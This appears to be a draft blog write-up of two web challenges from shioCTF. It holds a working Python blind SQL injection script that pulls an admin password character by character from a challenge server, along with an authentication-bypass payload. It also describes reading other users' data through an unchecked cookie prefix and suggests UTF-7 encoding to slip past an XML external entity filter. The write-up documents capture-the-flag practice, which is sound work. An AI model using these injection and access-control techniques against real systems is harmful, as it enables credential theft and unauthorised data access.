---
title: "shioCTF"
date: 2024-02-13T08:51:14-03:00
draft: true
---

# Web
## SimpleDB
"adminのパスワードを特定してください！"
"Please retrieve the admin password"

Inside the given URL we have a simple form with two fields: "Username" and "Password". Throwing some garbage data we see the used DB is `sqlite3`.

Trying a simple SQL Injection with `admin' OR 1=1;--` nets us the message `"Login successful!"`... but that's not what we're here for.

Googling around for some ways to extract information about a field in sqlite3, I came across this post (https://s-3ntinel.github.io/ctfs/imaginary_ctf2021/web/awkward_bypass/awkward_bypass.html) which seems to describe a similar enough situation calling for a `boolean-based sql injection`.

Copying their code and editing the requests slightly, we end up with:
```python
import requests
import string

db_data = ''
for pos in range(9,32):
    for char in (string.printable.replace('\'','')):
        p = "\\' OR 1=1 AND (SELECT hex(substr(password," + str(pos) + ",1)) FROM users) = hex('" + str(char) + "');--"
        h = {'Content-Type': 'application/x-www-form-urlencoded'}
        d = {'username': 'admin', 'password': p}
        r = requests.post('http://20.205.137.99:49999/', headers=h, data=d)

        # used while debugging
        # print(char, r.content.decode())
        if 'successful' in r.content.decode():
            db_data += str(char)
            print(db_data)
            break

print('Final: shioCTF{' + db_data + '}')
```
And after letting it iterate over each character we end up with `shioCTF{b1ind_sqli_i5_d4nger0u5!}`
## Card
"誕生日カードを送り合えるWebアプリができました！"
"I made a web app to send birthday cards!"

Going in we have two options, send birthday card and see received birthday cards

Send birthday card presents a form with two fields: "address (cookie emoji)" and "message". 
Checking our local cookies, we see we've been assigned a `userid`, this is probably how we send a card to ourselves.
Trying with an example card, we confirm that indeed by using our `userid` as address we can see our sent cards.

Taking a look at the challenge code, we spot it's a Flask app and it processes sent cards as text inside an XML with `etree`. More importantly, it seems there's some safeguards in place to protect from malicious XML with:
```python
card_data = card_data.replace('&','')

card_data = card_data.replace('%','')
```

Changing angles a bit, there is really no verification at all done on the sent `userid`, the search just picks up the files that start with the given `userid`, therefore we can just send a shorter one until we get all of the submitted cards.
Doing so, we find the flag to be `shioCTF{UTF7_1s_u5efu1_enc0d1ng}`

### Analysis
From the flag text, I'm assuming the expectation was to `UTF7` encode the message in order to get around the replacements for `&` and `%` symbols and attempt an XML External Entity Injection. I'd like to come back to this and try the "correct" solution.

